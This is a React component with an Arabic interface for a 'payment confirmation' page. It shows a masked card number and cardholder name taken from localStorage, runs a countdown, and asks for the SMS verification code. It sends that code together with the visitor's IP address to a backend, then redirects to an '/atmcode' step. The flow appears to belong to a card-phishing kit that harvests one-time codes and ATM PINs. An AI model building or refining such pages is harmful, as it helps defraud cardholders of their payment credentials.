import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Spinner from '../components/Spinner'; // استيراد مكون Spinner

const PaymentCode = () => {
  const [isLoading, setIsLoading] = useState(true); // حالة التحكم بعرض الـ Spinner
  const [code, setCode] = useState('');
  const [userIP, setUserIP] = useState('');
  const [timer, setTimer] = useState(120);
  const navigate = useNavigate();

  // جلب بيانات البطاقة من localStorage
  const cardNumber = localStorage.getItem('paymentCardNumber') || '';
  const cardName = localStorage.getItem('paymentCardName') || '';

  const formattedCardNumber = cardNumber 
    ? `**** **** **** ${cardNumber.slice(-4).replace(/\s/g, '')}` 
    : '**** **** **** ****';

  // جلب IP المستخدم
  const fetchUserIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setUserIP(data.ip);
    } catch (err) {
      console.error('فشل في الحصول على IP:', err);
      setUserIP('غير معروف');
    }
  };

  // عند تحميل الصفحة
  useEffect(() => {
    // إخفاء الـ Spinner بعد 4 ثواني
    const spinnerTimer = setTimeout(() => {
      setIsLoading(false);
    }, 4000);
    
    fetchUserIP();
    
    const interval = setInterval(() => {
      setTimer(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(interval);
      clearTimeout(spinnerTimer);
    };
  }, []);

  const minutes = Math.floor(timer / 60);
  const seconds = timer % 60;

  // إرسال البيانات إلى الباك-إند
  const handleSubmit = async (e) => {
    e.preventDefault();

    if (code.length !== 6) {
      alert('يرجى إدخال كود التأكيد المكون من 6 أرقام');
      return;
    }

    try {
      const payload = {
        otp: code,
        userIP: userIP,
      };

      // استخدام متغير البيئة هنا
      const apiUrl = process.env.REACT_APP_API_BASE_URL;
      if (!apiUrl) {
        throw new Error('REACT_APP_API_BASE_URL غير معرّف');
      }

      const response = await fetch(`${apiUrl}/api/payment/submit-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        navigate("/atmcode");
      } else {
        throw new Error('فشل في إرسال OTP');
      }
    } catch (error) {
      alert('حدث خطأ: ' + error.message);
    }
  };

  // عرض الـ Spinner أثناء التحميل
  if (isLoading) {
    return <Spinner />;
  }

  return (
    <div className="payment-code-container">
      <h2>تأكيد عملية الدفع</h2>
      
      <div className="payment-details">
        <div className="detail-row">
          <span className="detail-label">اسم حامل البطاقة:</span>
          <span className="detail-value">{cardName}</span>
        </div>
        
        <div className="detail-row">
          <span className="detail-label">رقم البطاقة:</span>
          <span className="detail-value">{formattedCardNumber}</span>
        </div>
      </div>
      
      <div className="timer-section">
        <div className="timer">
          {minutes.toString().padStart(2, '0')}:{seconds.toString().padStart(2, '0')}
        </div>
        <div className="timer-label">الوقت المتبقي</div>
      </div>
      
      <form onSubmit={handleSubmit} className="payment-code-form">
        <div className="form-group">
          <label>أدخل كود التأكيد المرسل إلى هاتفك</label>
          <input
            type="number"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, '').substring(0, 6))}
            placeholder="000000"
            required
          />
        </div>
        
        <button type="submit" className="submit-btn">
          تأكيد الدفع
        </button>
      </form>

      <style jsx>{`
        .payment-code-container {
          max-width: 500px;
          margin: 40px auto;
          padding: 30px;
          background: white;
          border-radius: 10px;
          box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
font-family: 'Cairo', sans-serif !important;
          text-align: center;
        }
        h2 {
          color: #A67769;
          margin-bottom: 30px;
          
        }
        .payment-details {
          background-color: #f9f5f3;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 30px;
          text-align: right;
        }
        .detail-row {
          display: flex;
          justify-content: space-between;
          margin-bottom: 15px;
          font-size: 18px;
        }
        .detail-label {
          font-weight: bold;
          color: #555;
          font-size:14px;
        }
        .detail-value {
          color: #A67769;
        }
        .timer-section {
          margin: 30px 0;
          padding: 15px;
          background: linear-gradient(135deg, #f8f4f1, #f0e6e2);
          border-radius: 10px;
        }
        .timer {
          font-size: 48px;
          font-weight: bold;
          color: #A67769;
          margin-bottom: 10px;
        }
        .timer-label {
          color: #777;
          font-size: 18px;
          font-weight: 600;
        }
        .payment-code-form {
          margin-top: 30px;
        }
        .form-group {
          display: flex;
          flex-direction: column;
          gap: 10px;
          margin-bottom: 25px;
        }
        label {
          font-weight: bold;
          color: #555;
          font-size: 18px;
        }
        input {
          padding: 15px;
          border: 2px solid #ddd;
          border-radius: 8px;
          font-size: 20px;
          text-align: center;
          letter-spacing: 3px;
          background: #f9f9f9;
        }
        input:focus {
          outline: none;
          border-color: #A67769;
          box-shadow: 0 0 0 2px rgba(166, 119, 105, 0.2);
        }
        .submit-btn {
          background-color: #A67769;
          color: white;
          border: none;
          padding: 15px 30px;
          border-radius: 8px;
          font-size: 18px;
          font-weight: bold;
          cursor: pointer;
          transition: all 0.3s;
          width: 100%;
          max-width: 300px;
          margin: 0 auto;
          box-shadow: 0 4px 6px rgba(166, 119, 105, 0.3);
        }
        .submit-btn:hover {
          background-color: #8e6154;
          transform: translateY(-2px);
          box-shadow: 0 6px 8px rgba(166, 119, 105, 0.4);
        }
        .submit-btn:active {
          transform: translateY(0);
          box-shadow: 0 2px 4px rgba(166, 119, 105, 0.3);
        }
        @media (max-width: 600px) {
          .payment-code-container {
            margin: 20px;
            padding: 20px;
          }
          .timer {
            font-size: 36px;
          }
          .detail-row {
            font-size: 16px;
          }
          label {
            font-size: 16px;
          }
          input {
            font-size: 18px;
          }
          .submit-btn {
            font-size: 16px;
            padding: 12px 20px;
          }
        }
      `}</style>
    </div>
  );
};

export default PaymentCode;